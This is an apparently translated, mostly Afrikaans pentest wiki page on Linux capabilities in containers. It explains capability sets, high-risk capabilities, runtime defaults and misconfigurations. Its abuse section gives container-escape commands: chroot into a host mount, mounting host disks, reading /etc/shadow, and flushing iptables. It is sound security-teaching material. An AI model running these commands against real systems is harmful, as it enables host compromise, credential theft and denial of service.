# Linux-bevoegdhede in Houers

{{#include ../../../../banners/hacktricks-training.md}}

## Oorsig

Linux-bevoegdhede is een van die belangrikste dele van houer-sekuriteit omdat hulle 'n subtiele maar fundamentele vraag beantwoord: **wat beteken "root" regtig binne 'n houer?** Op 'n gewone Linux-stelsel het UID 0 histories 'n baie breë stel bevoegdhede geïmpliseer. In moderne kerne is daardie bevoegdheid opgebreek in kleiner eenhede wat capabilities genoem word. 'n Proses kan as root loop en steeds baie magtige operasies ontbeer indien die relevante capabilities verwyder is.

Houers steun sterk op hierdie onderskeid. Baie workloads word steeds as UID 0 binne die houer begin vir versoenbaarheid of eenvoud. Sonder capability-dropping sou dit veel te gevaarlik wees. Met capability-dropping kan 'n houer-gebaseerde root-proses steeds veel gewone in-houer take uitvoer terwyl dit ontken word vir meer sensitiewe kernel-operasies. Daarom beteken 'n houer-shell wat sê `uid=0(root)` nie outomaties "host root" of selfs "breë kernel-bevoegdheid" nie. Die bevoegdheidsstelle bepaal hoeveel daardie root-identiteit werklik werd is.

Vir die volledige Linux-capability verwysing en baie misbruikvoorbeelde, sien:

{{#ref}}
../../linux-capabilities.md
{{#endref}}

## Werking

Capabilities word in verskeie stelle getrakteer, insluitend permitted, effective, inheritable, ambient, en bounding stelle. Vir baie houer-assessments is die presiese kernel-semantiek van elke stel minder onmiddellik belangrik as die finale praktiese vraag: **watter geprivilegieerde operasies kan hierdie proses tans suksesvol uitvoer, en watter toekomstige bevoegdheidstoenames is nog moontlik?**

Die rede waarom dit saak maak is dat baie ontsnaptegnieke eintlik bevoegdheidsprobleme is wat as houerprobleme vermom is. 'n Workload met `CAP_SYS_ADMIN` kan 'n groot hoeveelheid kernel-funksionaliteit bereik wat 'n normale houer-root-proses nie behoort aan te raak nie. 'n Workload met `CAP_NET_ADMIN` word veel gevaarliker as dit ook die host network namespace deel. 'n Workload met `CAP_SYS_PTRACE` raak baie meer interessant as dit host-prosesse kan sien deur host PID-sharing. In Docker of Podman kan dit as `--pid=host` verskyn; in Kubernetes verskyn dit gewoonlik as `hostPID: true`.

Met ander woorde, die bevoegdheidsstel kan nie in isolasie geëvalueer word nie. Dit moet saam gelees word met namespaces, seccomp, en MAC policy.

## Laboratorium

'n Baie direkte manier om bevoegdhede binne 'n houer te inspekteer is:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Jy kan ook 'n meer beperkende container vergelyk met een wat alle capabilities bygevoeg het:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Om die effek van 'n beperkte toevoeging te sien, probeer om alles te verwyder en net een capability terug te voeg:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
These small experiments help show that a runtime is not simply toggling a boolean called "privileged". It is shaping the actual privilege surface available to the process.

## Hoë-risiko bevoegdhede

Alhoewel baie capabilities, afhangend van die teiken, saak kan maak, is 'n paar herhaaldelik relevant in container escape-ontleding.

**`CAP_SYS_ADMIN`** is die een wat verdedigers met die meeste agterdog moet behandel. Dit word dikwels beskryf as "the new root" omdat dit 'n enorme hoeveelheid funksionaliteit ontsluit, insluitend mount-verwante operasies, namespace-sensitive gedrag, en baie kernel-paaie wat nooit losweg aan containers blootgestel behoort te word nie. As 'n container `CAP_SYS_ADMIN` het, swak seccomp, en geen sterk MAC confinement nie, word baie klassieke breakout paths baie meer realisties.

**`CAP_SYS_PTRACE`** is belangrik wanneer proses-sigbaarheid bestaan, veral as die PID namespace met die host of met interessante naburige workloads gedeel word. Dit kan sigbaarheid in manipulasie omskakel.

**`CAP_NET_ADMIN`** en **`CAP_NET_RAW`** is relevant in netwerk-gefokusde omgewings. Op 'n geïsoleerde bridge-netwerk kan hulle reeds riskant wees; in 'n gedeelde host network namespace is dit veel erger omdat die workload dalk die host networking kan herkonfigureer, sniff, spoof, of inmeng met plaaslike verkeer.

**`CAP_SYS_MODULE`** is gewoonlik katastrofies in 'n rootful omgewing omdat die laai van kernel modules effektief host-kernel beheer is. Dit behoort byna nooit in 'n algemene-doel container workload te verskyn nie.

## Runtime Gebruik

Docker, Podman, containerd-based stacks, and CRI-O all use capability controls, but the defaults and management interfaces differ. Docker exposes them very directly through flags such as `--cap-drop` and `--cap-add`. Podman exposes similar controls and frequently benefits from rootless execution as an additional safety layer. Kubernetes surfaces capability additions and drops through the Pod or container `securityContext`. System-container environments such as LXC/Incus also rely on capability control, but the broader host integration of those systems often tempts operators into relaxing defaults more aggressively than they would in an app-container environment.

Dieselfde beginsel geld vir almal: 'n capability wat tegnies moontlik is om te verleen, is nie noodwendig een wat verleen behoort te word nie. Baie werklike insidente begin wanneer 'n operator 'n capability byvoeg bloot omdat 'n workload misluk het onder 'n strenger konfigurasie en die span 'n vinnige oplosmiddel nodig gehad het.

## Miskonfigurasies

Die mees voor die hand liggende fout is **`--cap-add=ALL`** in Docker/Podman-styl CLI's, maar dit is nie die enigste nie. In die praktyk is 'n meer algemene probleem om een of twee uiters kragtige capabilities, veral `CAP_SYS_ADMIN`, toe te ken om die toepassing net "te laat werk" sonder om ook die namespace-, seccomp- en mount-implikasies te verstaan. 'n Ander algemene faalmodus is om ekstra capabilities te kombineer met host namespace-deling. In Docker of Podman kan dit verskyn as `--pid=host`, `--network=host`, of `--userns=host`; in Kubernetes verskyn die ekwivalente blootstelling gewoonlik deur workload-instellings soos `hostPID: true` of `hostNetwork: true`. Elk van daardie kombinasies verander wat die capability eintlik kan beïnvloed.

Dit is ook algemeen om administrateurs te sien glo dat omdat 'n workload nie volledig `--privileged` is nie, dit steeds betekenisvol beperk is. Soms is dit waar, maar soms is die effektiewe houding reeds so na aan privileged dat die onderskeid operasioneel ophou saak maak.

## Misbruik

Die eerste praktiese stap is om die effektiewe capability-stel te enumereer en dadelik die capability-spesifieke aksies te toets wat saak sou maak vir escape of toegang tot host-inligting:
```bash
capsh --print
grep '^Cap' /proc/self/status
```
As `CAP_SYS_ADMIN` teenwoordig is, toets eers mount-based abuse en host filesystem access, omdat dit een van die mees algemene breakout enablers is:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
Indien `CAP_SYS_PTRACE` teenwoordig is en die container interessante prosesse kan sien, verifieer of die capability in prosesinspeksie omgeskakel kan word:
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
Indien `CAP_NET_ADMIN` of `CAP_NET_RAW` teenwoordig is, toets of die workload die sigbare netwerkstapel kan manipuleer of ten minste nuttige netwerkintelligensie kan insamel:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
Wanneer 'n capability test slaag, kombineer dit met die namespace-situasie. 'n capability wat slegs riskant lyk in 'n isolated namespace, kan onmiddellik 'n escape of host-recon primitive word wanneer die container ook host PID, host network, of host mounts deel.

### Volledige voorbeeld: `CAP_SYS_ADMIN` + Host Mount = Host Escape

Indien die container oor `CAP_SYS_ADMIN` beskik en 'n skryfbare bind mount van die host filesystem soos `/host` het, is die escape path dikwels eenvoudig:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
As `chroot` slaag, word opdragte nou in die konteks van die gasheer se root-lêerstelsel uitgevoer:
```bash
id
hostname
cat /etc/shadow | head
```
As `chroot` nie beskikbaar is nie, kan dieselfde resultaat dikwels bereik word deur die binary via die gemonteerde boom aan te roep:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### Volledige voorbeeld: `CAP_SYS_ADMIN` + Toesteltoegang

As 'n bloktoestel van die gasheer blootgestel is, kan `CAP_SYS_ADMIN` dit omskep in direkte toegang tot die gasheer se lêerstelsel:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### Volledige Voorbeeld: `CAP_NET_ADMIN` + Host Networking

Hierdie kombinasie produseer nie altyd direk host root nie, maar dit kan die gasheer se netwerkstapel volledig herkonfigureer:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Dit kan denial of service veroorsaak, traffic interception moontlik maak, of toegang tot dienste gee wat voorheen gefiltreer is.

## Kontroles

Die doel van die capability checks is nie net om dump raw values nie, maar om te verstaan of die proses genoeg privilege het om sy huidige namespace en mount-situasie gevaarlik te maak.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Wat hier interessant is:

- `capsh --print` is die maklikste manier om hoë-risiko capabilities soos `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin`, of `cap_sys_module` raak te sien.
- Die `CapEff`-reël in `/proc/self/status` vertel jou wat tans werklik effektief is, nie net wat moontlik in ander stelle beskikbaar mag wees nie.
- 'n capability dump word veel belangriker as die container ook die host PID-, netwerk-, of user namespaces deel, of skryfbare host-mounts het.

Na die insameling van die rou capability-inligting is die volgende stap interpretasie. Vra of die proses root is, of user namespaces aktief is, of host namespaces gedeel word, of seccomp afdwingend is, en of AppArmor of SELinux die proses nog beperk. 'n capability-stel op sigself is net 'n deel van die storie, maar dit is dikwels die deel wat verduidelik waarom een container breakout werk en 'n ander misluk met dieselfde skynbare beginpunt.

## Runtime-standaarde

| Runtime / platform | Standaard toestand | Standaard gedrag | Algemene manuele verswakking |
| --- | --- | --- | --- |
| Docker Engine | Verminderde capability-stel by verstek | Docker hou 'n standaard toelaatlys van capabilities en verwyder die res | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Verminderde capability-stel by verstek | Podman containers is sonder voorregte by verstek en gebruik 'n verminderde capability-model | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Erf runtime-standaarde tensy verander | As geen `securityContext.capabilities` gespesifiseer is nie, kry die container die standaard capability-stel van die runtime | `securityContext.capabilities.add`, versuim om `drop: [\"ALL\"]` te gebruik, `privileged: true` |
| containerd / CRI-O under Kubernetes | Meestal runtime-standaarde | Die effektiewe stel hang af van die runtime plus die Pod spec | dieselfde as Kubernetes-ry; direkte OCI/CRI-konfigurasie kan ook capabilities eksplisiet byvoeg |

Vir Kubernetes is die belangrike punt dat die API nie een universele standaard capability-stel definieer nie. As die Pod nie capabilities byvoeg of verwyder nie, erf die workload die runtime-standaard vir daardie node.
